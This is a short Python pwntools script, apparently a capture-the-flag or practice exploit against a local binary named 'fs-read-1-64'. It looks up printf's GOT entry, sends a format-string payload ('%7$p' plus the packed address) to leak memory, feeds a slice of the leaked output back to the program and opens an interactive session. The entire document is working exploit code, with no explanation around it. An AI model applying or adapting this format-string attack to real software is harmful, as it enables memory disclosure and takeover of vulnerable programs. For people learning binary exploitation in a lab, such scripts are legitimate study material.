#!/usr/bin/env python
from pwn import *

p = process("./fs-read-1-64")

got_of_printf = p.elf.got['printf']

print("Got of printf %s" % hex(got_of_printf))

p.sendline("%7$p"+p64(got_of_printf))

data = p.recv(0x200)

print(data)

new_data = data[36:-38]

print(new_data)

p.sendline(new_data)

p.interactive()